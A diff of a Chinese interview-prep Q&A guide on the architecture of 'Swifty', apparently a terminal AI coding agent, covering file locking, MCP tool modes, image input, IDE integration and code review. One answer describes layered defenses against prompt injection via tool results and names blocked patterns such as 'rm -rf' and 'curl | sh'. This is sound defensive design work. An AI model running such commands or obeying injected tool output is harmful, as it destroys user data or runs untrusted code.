+        backoff = Math.min(backoff * 2, 80); // 上限防雪崩, 可加随机抖动防惊群
         continue;
       }
       throw err;
@@ -2004,7 +2013,7 @@ function withLock<T>(lockPath: string, fn: () => T): T {
 }
 ```
 
-考点: ① `wx` 的 O_EXCL 原子性( 创建即抢锁, 无 TOCTOU) ; ② stale 机制防持锁进程崩溃死锁; ③ 随机退避防惊群; ④ `finally` 中释放, 且释放失败可容忍( 锁可能已被强取) ; ⑤ 同步等待用 `Atomics.wait` 而非 `setTimeout`( 调用方是同步 API `receiveSync`) . 追问: 为什么不用 `flock`? —— 可移植性( macOS/Linux/Windows 语义不一) , 锁文件是纯 POSIX 语义.
+考点: ① `wx` 的 O_EXCL 原子性( 创建即抢锁, 无 TOCTOU) ; ② stale 机制防持锁进程崩溃死锁; ③ 指数退避 + 上限( Swifty 实现为带 jitter 的指数退避, 5ms 起、80ms 封顶, 见 file-mailbox.ts:73-77) ; ④ 超时抛错而非静默丢消息( 邮箱丢消息不可接受) ; ⑤ `finally` 中释放, 且释放失败可容忍( 锁可能已被强取) ; ⑥ 同步等待用 `Atomics.wait` 而非 `setTimeout`( 调用方是同步 API `receiveSync`) . 追问: 为什么不用 `flock`? —— 可移植性( macOS/Linux/Windows 语义不一) , 锁文件是纯 POSIX 语义.
 
 ---
 
@@ -2169,7 +2178,7 @@ class TokenEstimator {
 参考答案要点( 分层防御, 映射到 Swifty 现有机制) :
 
 1. 边界标记( 数据与指令分离) : 工具结果在送入模型时用明确边界包裹( Swifty 已用 `<system-reminder>` 包裹系统注入; 可为工具结果加 `<tool-output source="untrusted">` 标记) , 并在系统提示词中声明"工具输出是数据不是指令". 这是弱防御( 模型依从性不保证) , 但成本为零.
-2. 权限层是强防线: 注入文本要造成伤害必须通过工具调用 —— 权限系统( Q25) 天然拦截: 危险命令黑名单( `rm -rf` 直接 deny) 、写操作需用户确认、路径沙箱限制爆炸半径. 权限层不解析意图, 只审查行为, 所以对注入免疫.
+2. 权限层是强防线: 注入文本要造成伤害必须通过工具调用 —— 权限系统( Q25) 天然拦截: 写操作需用户确认、路径沙箱限制爆炸半径、Layer 5 规则引擎可配置 deny 规则( 注意 Layer 3 内置危险命令模式数组当前为空, 危险命令拦截需用户通过规则文件自行配置) . 权限层不解析意图, 只审查行为, 所以对注入免疫.
 3. 动作-来源关联: 给工具结果标记信任等级( Bash 输出 < 文件内容 < 网页/MCP 结果) , 高敏感操作( 写、命令) 若其参数包含低信任来源的文本片段, 强制人工确认 —— 类似浏览器的 taint tracking.
 4. HITL 确认增强: 权限对话框展示"该命令参数包含来自 WebFetch 结果的内容"警告, 帮助用户做出知情决策.
 5. 出站防护: Hook 系统的 `pre_tool_use` + `reject` 已支持用户自定义策略( 如"命令中禁止出现 curl | sh 模式") , 开放给用户作为自防线.
@@ -2309,7 +2318,7 @@ class TokenEstimator {
 - `tui/`( Ink→React DOM, 但组件结构可映射: Static→普通列表、50ms 节流/稳定前缀缓存等模式直接搬) ;
 - 平台原语: Bash 工具( 浏览器无子进程 —— 需服务端执行走 WS, 或换 WebContainers) 、文件系统工具( IndexedDB/OPFS 或服务端代理) 、沙箱( 浏览器本身就是沙箱, 但文件访问能力受限) .
 
-架构印证: 这正是 Q1/Q6 设计的回报 —— 领域层零平台依赖( 所有平台原语经 `Tool`/`ToolContext` 接口注入) , UI 层是薄壳. remote 模式( Q61) 已经演示了"换皮"只需 1500 行 server + 一个前端. 反过来说, 若当初把 `fs`/`spawn` 直接写进 Agent 核心, 移植就是灾难. 接口隔离的架构决策, 其价值在第二次移植时才完全兑现.
+架构印证: 这正是 Q1/Q6 设计的回报 —— 领域层零平台依赖( 所有平台原语经 `Tool`/`ToolContext` 接口注入) , UI 层是薄壳. remote 模式( Q61) 已经演示了"换皮"只需约 1700 行 server + 一个前端. 反过来说, 若当初把 `fs`/`spawn` 直接写进 Agent 核心, 移植就是灾难. 接口隔离的架构决策, 其价值在第二次移植时才完全兑现.
 
 ---
 
@@ -2358,9 +2367,9 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 基于源码观察的三处( 面试时要展现"既欣赏设计也能直面问题") :
 
-1. `app.tsx` 的巨石化( 2042 行、800 行命令 switch) : 命令分发逻辑应抽出为"命令处理器注册表"( 每命令一个 handler 模块, 类似 remote 的 handleLocalUICommand 但更彻底) , 事件循环的 switch 拆为 handler 映射. 排期: 优先 —— 它是所有 UI 功能的必经之路, 腐烂速度最快; 偿还方式是小步重构( 每次抽一类命令) , 有现有测试兜底.
+1. `app.tsx` 的巨石化( 2150 行、数百行命令 switch) : 命令分发逻辑应抽出为"命令处理器注册表"( 每命令一个 handler 模块, 类似 remote 的 handleLocalUICommand 但更彻底) , 事件循环的 switch 拆为 handler 映射. 排期: 优先 —— 它是所有 UI 功能的必经之路, 腐烂速度最快; 偿还方式是小步重构( 每次抽一类命令) , 有现有测试兜底.
 2. 权限系统的 YAML 规则与硬编码层级的混合: Layer 2/3 的安全规则( 只读命令表、危险模式正则) 硬编码在 checker.ts 中 —— 安全规则是变化最频繁的知识, 应外置为数据文件( 可热更新、可审计、可被规则引擎统一管理) . 排期: 中期 —— 功能正确但演进成本高; 偿还时附带 Q29 提的审计日志.
-3. teammate 与 remote 的能力缺口( remote 不支持 fork 技能/rewind/worktree, teammate 无压缩注入) : 这些是"显式降级"遗留 —— 诚实但确实是债. 排期: 按用户需求驱动( YAGNI) , 但应先在共享层抽象"能力矩阵", 避免缺口靠口口相传.
+3. teammate 与 remote 的能力缺口( remote 不支持 fork 技能/rewind/worktree, teammate 压缩后不重注入项目指令与长期记忆) : 这些是"显式降级"遗留 —— 诚实但确实是债. 排期: 按用户需求驱动( YAGNI) , 但应先在共享层抽象"能力矩阵", 避免缺口靠口口相传.
 
 回答结构: 指出问题( 文件+行号级证据) → 为什么是债( 变化点/腐烂速度) → 怎么还( 小步、有测试) → 何时还( 优先级逻辑) —— 展现的是工程管理能力而非抱怨.
 
@@ -2375,7 +2384,7 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 > Swifty 是一个终端里的 AI 编程助手 —— 用户给它一个目标, 它自主地读代码、改代码、跑命令, 直到完成任务.
 >
 > 技术上它解决了四个真问题:
-> 第一, 自治循环的可靠性. 核心是异步生成器驱动的事件流引擎, LLM 出错时有四档自愈 —— 限流退避、上下文压缩、输出续写、幻觉熔断, 用户看到的是"永远在推进"而非报错.
+> 第一, 自治循环的可靠性. 核心是异步生成器驱动的事件流引擎, LLM 出错时有四档自愈 —— 限流退避、上下文压缩、输出续写、工具幻觉错误回灌自纠, 用户看到的是"永远在推进"而非报错.
 > 第二, 安全. 七层权限管线加操作系统级沙箱 —— 模型可以自主工作, 但危险操作永远过不了用户这一关, 且所有决策可审计.
 > 第三, 成本. 上下文窗口是钱 —— 我们用三级压缩( 大结果落盘、保留尾部摘要、工作记忆恢复) 、prompt 缓存三断点、便宜模型跑探索子代理, 把长任务成本压到可接受.
 > 第四, 可扩展. 工具、技能、命令、钩子、MCP 五类扩展点全部是声明式的( markdown + YAML) , 用户不改代码就能定制.
@@ -2386,12 +2395,70 @@ LLM 输出用 Zod 校验是 Agent 应用的特殊要点: 模型的 function call
 
 ---
 
+## 十八、补充子系统: MCP 加载策略、图像、IDE 集成与代码评审
+
+### Q101: MCP 工具进入上下文的方式有哪三种模式? 为什么 tools 数组的稳定性如此重要?
+
+答:
+
+`mcp/strategy.ts` 的 `decideAndApply()` 在 MCP 连接完成、全部内置工具注册之后执行一次( 时机刻意靠后: 模式判定要拿"全部工具 schema 总量"与上下文窗口比较) , 三种模式:
+
+1. eager: 全部 MCP schema 的字符总量( 按 `CHARS_PER_TOKEN = 2.5` 折算, JSON 符号密集所以比值低于自然语言的 3.5) 低于上下文窗口的 10%( `DEFAULT_EAGER_THRESHOLD_PERCENT`, strategy.ts:51) → 全部进 tools[], 无延迟加载. 省下的上下文不值得为此承担任何复杂度.
+2. native: 官方 Anthropic 端点( `isOfficialAnthropicEndpoint()` 判定 host) → 工具留在 tools[] 但带 `defer_loading` 标记, 由服务端对模型隐藏; ToolSearch 命中后返回 `tool_reference`, 服务端再展开 schema. tools 数组字节级不变.
+3. dispatch: 其他端点( 国产厂商、各类代理网关) 两者都不支持 → 自行模拟: MCP 工具完全不进 tools[], 模型统一经单一的 `McpCall` 工具按 `server__tool` 派发.
+
+为什么如此在意 tools 数组的稳定性 —— strategy.ts:37-40 的注释给出了实测数据: tools 渲染在 system 之后、messages 之前, 数组任何变化都会使其后全部对话历史的 prompt cache 失效; 在一个 2 万 token 历史的会话里, 向 tools 末尾追加一个工具, 缓存命中率从 99.4% 跌到 9.5%, 等于全量重算. 所以 `exposeToolSearch`/`exposeMcpCall` 两个开关也是本模式判定时一次性算好并整个会话固定( registry.ts:41-49 注释) , 避免"会话中途 tools[] 变化". 这是"用数据说话的缓存工程"范例.
+
+### Q102: 图像支持是如何实现的? 从剪贴板粘贴到进入 LLM 上下文要经过哪些关卡?
+
+答:
+
+链路( `images/image.ts` + `images/clipboard.ts` + `tui/input.tsx` + `tui/at-expand.ts`) :
+
+1. 粘贴入口: InputBox 的 `usePaste` 回调收到空文本时视为"可能粘贴了图像", 触发 `pasteImageFromClipboard()`( input.tsx:351) → `saveClipboardImage()` 平台分发读取剪贴板 —— macOS 用 `osascript`、Linux/Windows 各有实现( clipboard.ts:141-207) ; 仅接受 PNG, 校验魔数( `isPngBuffer`) 与大小上限.
+2. 落盘与去重: 图像存入会话的 file-history 目录, 文件名取 `sha256(bytes).slice(0,16).png`( clipboard.ts:23) —— 与文件历史备份同一命名方案, 同一张图粘贴两次复用同一文件; 随后向输入框插入 `@<相对路径>` 引用.
+3. 提交展开: `expandAtRefsWithImages()`( at-expand.ts:106) 识别图片后缀, `loadImageAttachment()`( image.ts:120) 走"格式魔数嗅探 → 尺寸/体积压缩"流水线 —— 扩展名不可信, 魔数判定真实格式( sniffMediaType, image.ts:91-115) ; 原始字节 ≤ 3.75MB 直接透传( 5MB 是 base64 后的 API 上限, 3.75 = 5 * 3/4) , 超限则用 sharp 压缩: 边长封顶 2000px, PNG 保格式压缩, 再沿 JPEG 质量 80/60/40/20 阶梯下降, 仍超限则尺寸减半重试( 最多两次) , GIF/WebP 需要压缩时重编码( 动图归一到首帧) .
+4. 入上下文: 返回 base64 image content block, 每条用户消息上限 `MAX_IMAGES_PER_MESSAGE = 10`( image.ts:63) ; 会话持久化时 base64 内联进 JSONL( app.tsx:1869-1878) .
+5. 上下文预算: 压缩估算里每个 image block 记 `IMAGE_CHAR_EQUIV = 7000` 字符( 约合 1750 token, Anthropic 单图成本量级, compact.ts:112) , 防止图像密集会话系统性低估、压缩过晚; 工具结果落盘则永远跳过 image 块( agent.ts:517-519, 图片必须原样发给 API) .
+
+这是一个典型的"多级降级管道": 每一关( 格式、体积、尺寸、数量) 都有明确上限与对应的降级动作, 而不是一刀切报错.
+
+### Q103: VSCode/IDE 集成是如何实现的? `@file#L3-10` 行号引用从哪来?
+
+答:
+
+`src/vscode/` 三个模块复用了 Claude Code 扩展的内嵌 MCP 服务器:
+
+1. 发现( lockfile.ts) : 扩展激活时写 `~/.claude/ide/<port>.lock`( JSON: workspaceFolders/pid/ideName/transport/authToken) , 并向集成终端注入 `CLAUDE_CODE_SSE_PORT` 环境变量. `detectIde()` 扫描锁文件, 匹配规则: 端口等于环境变量的优先; 否则 cwd 落在其 workspaceFolders 内且唯一匹配才采用; pid 已死的锁文件忽略. 路径比较做了 NFC/NFD 归一化( macOS 返回 NFD、VSCode 上报 NFC, lockfile.ts:60-70) .
+2. 连接( ide-client.ts + ws-transport.ts) : 用 MCP SDK 的 Client 配自实现 `WebSocketTransport`( `ws://127.0.0.1:<port>`, 带 `X-Claude-Code-Ide-Authorization` 头) ; 连上后发 `ide_connected` 通知携带本进程 pid —— 扩展靠它把 Cmd+Option+K 路由到正确终端里的 CLI. 仅当疑似在 IDE 终端( 环境变量存在或 TERM_PROGRAM=vscode) 时才轮询等待扩展激活( 最多 30s, 每秒一次) , 否则立即放弃.
+3. 消费: 监听 `at_mentioned` 通知( 扩展传来文件路径 + 0-based 行区间, ide-client.ts:106-118 转成 1-based) , app.tsx 把它拼成 `@相对路径#L3-10` 插入输入框( app.tsx:405-436) ; 提交时 at-expand 的 `parseRef()` 正则解析行区间, 只内联指定行( at-expand.ts:34-57) , 巨大文件也不怕( 有 MAX_RANGE_FILE_BYTES 上限) .
+
+工程启示: 不重新发明 IDE 协议, 直接寄生在已有生态的发现机制( 锁文件 + 环境变量) 上, 用最小代码( 三个文件) 拿到"编辑器选中代码 → 终端 Agent 精确上下文"的高价值体验.
+
+### Q104: `/review` 与 `/code-review` 是什么关系? 代码评审子系统如何用团队机制实现多角色评审?
+
+答:
+
+两条产品路径:
+
+1. `/review`( commands.ts:318) : 轻量路径, 类型为 `prompt` —— handler 返回一段固定提示词, 要求模型跑 `git status`/`git diff` 后以 `file:line` 形式报告正确性 bug、安全问题与可简化点. 无状态、零基础设施.
+2. `/code-review`( commands.ts:304) : 重路径, 类型为 `local`( handler 返回字符串) , 由 `code-review/handler.ts` 的 `handleCodeReviewCommand()` 解析子命令 —— create/add/remove/list/status/activate/deactivate 管理评审团队, request/requests/comment/accept/reject/report/approve/reject-request 管理评审请求, critic/critic-summary/add-critic 管理批评者评估.
+
+状态模型( `code-review/manager.ts` + `session.ts`) :
+
+- 团队持久化在 `.swifty/code-review-teams.json`( Zod schema: name/members/createdAt/lastActive) , 成员含 `role: reviewer | lead | junior | critic` 与 expertise 数组; `createTeam()` 同时在 TeamManager 里建同名团队并 addMember, 复用团队邮箱做消息路由( manager.ts:92-109) ;
+- 会话态的 `ReviewSession`( session.ts) 建模评审工作流: ReviewRequest → ReviewComment( 带 `CommentResolution: accepted | rejected | pending | resolved`) → CriticAssessment( 对评论合理性做 `reasonable | unreasonable | partially-reasonable` 评估) → ReviewSummary/FileFeedback/CommentIssue 分层汇总.
+
+设计亮点: "评审员评论 → 批评者再评估评论"构成两级质检( 对 LLM 产出的评审意见本身做元评审) , 且角色/团队复用 teams 子系统的邮箱与成员管理 —— 评审子系统只新增了工作流状态机, 通信基础设施零重复.
+
+---
+
 ## 结语
 
-本文档覆盖 Swifty 的十七大主题、100 组问答( Q1–Q100) . 面试使用建议:
+本文档覆盖 Swifty 的十八大主题、104 组问答( Q1–Q104) . 面试使用建议:
 
-- 讲故事线: 架构( Q1-6) → 循环( Q7-13) → 协议( Q14-19) → 安全( Q25-29) → 渲染( Q30-38) → 内存治理( Q39-44) → 生态( Q50-54) → 工程化( Q55-58) → 运行模式( Q59-64) → 命令与基础设施( Q65-78) → 手写题( Q79-86) → 设计题( Q87-93) → 开放题( Q94-100) , 由主干到枝叶;
-- 被追问时的锚点: 每个回答都给了文件路径与常量( `agent.ts:527`、`CHARS_PER_TOKEN=3.5`、`MAX_TOKENS_CEILING=64000` …) , 细节是最好的信任背书;
+- 讲故事线: 架构( Q1-6) → 循环( Q7-13) → 协议( Q14-19) → 安全( Q25-29) → 渲染( Q30-38) → 内存治理( Q39-44) → 生态( Q50-54) → 工程化( Q55-58) → 运行模式( Q59-64) → 命令与基础设施( Q65-78) → 手写题( Q79-86) → 设计题( Q87-93) → 开放题( Q94-100) → 补充子系统( Q101-104) , 由主干到枝叶;
+- 被追问时的锚点: 每个回答都给了文件路径与常量( `agent.ts:650`、`CHARS_PER_TOKEN=3.5`、`MAX_TOKENS_CEILING=64000` …) , 细节是最好的信任背书;
 - 开放题模板: 现状局限 → 方案 → 权衡( Q29、Q38、Q58、Q99 示范) ;
 - 手写题( Q79–Q86) 均可现场白板: 节流、分批、压缩边界、增量渲染、文件锁、Promise 桥、reducer、token 估算;
 - 设计题( Q87–Q93) 每题给了方案骨架与评分点, 训练"架构迁移"能力.
